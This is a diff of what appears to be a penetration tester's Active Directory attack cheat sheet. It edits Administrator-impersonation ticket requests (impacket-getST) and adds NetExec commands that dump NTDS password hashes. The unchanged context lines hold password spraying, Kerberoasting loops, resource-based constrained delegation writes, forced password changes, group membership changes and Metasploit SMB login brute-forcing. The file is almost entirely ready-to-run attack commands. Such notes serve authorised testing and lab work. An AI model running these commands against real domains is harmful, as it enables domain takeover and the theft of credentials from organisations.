@@ -442,7 +442,7 @@ impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/-
 impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
 impacket-changepasswd -dc-ip $TARGET -newhashes :$(impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs) '$DOM'/'$USERNAME':'$PASSWORD'@$TARGET
 while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request-user '$user'; done < usernames
-impacket-getST -dc-ip $TARGET -u2u -impersonate "Administrator" -spn "cifs/$DC" '$DOM'/'$USERNAME' -k -no-pass 2>/dev/null
+impacket-getST -dc-ip $TARGET -u2u -impersonate "Administrator" -spn "host/$DC" '$DOM'/'$USERNAME' -k -no-pass 2>/dev/null
 
 +---------- NTLM Negotiation ----------+
 nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success
@@ -458,7 +458,7 @@ impacket-changepasswd -dc-ip $TARGET $DOM/'$USERNAME'@$TARGET -newpass '123qweas
 impacket-changepasswd -dc-ip $TARGET -newhashes :$(impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs) '$DOM'/'$USERNAME':'$PASSWORD'@$TARGET
 while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request-user '$user'; done < usernames
 impacket-rbcd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -delegate-from '$USERNAME' -delegate-to 'DC$' -action 'write'
-impacket-getST -dc-ip $TARGET -u2u -impersonate "Administrator" -spn "cifs/$DC" '$DOM'/'$USERNAME':'$PASSWORD' 2>/dev/null
+impacket-getST -dc-ip $TARGET -u2u -impersonate "Administrator" -spn "host/$DC" '$DOM'/'$USERNAME':'$PASSWORD' 2>/dev/null
 
 bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' add groupMember 'GROUP' 'USER'
 
@@ -542,6 +542,9 @@ smbclient \\\\$TARGET\\SHARENAME -U '$USERNAME'%'$PASSWORD'
 impacket-smbclient /'$USERNAME':'$PASSWORD'@$TARGET
 
 get filename.txt
+
+nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --ntds --user Administrator
+nxc smb $TARGET --use-kcache --ntds --user Administrator
 
 msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $TARGET; set SMBUser $USERNAME; set SMBPass $PASSWORD; set BLANK_PASSWORDS true; set CreateSession true; run"
 sessions -i 1
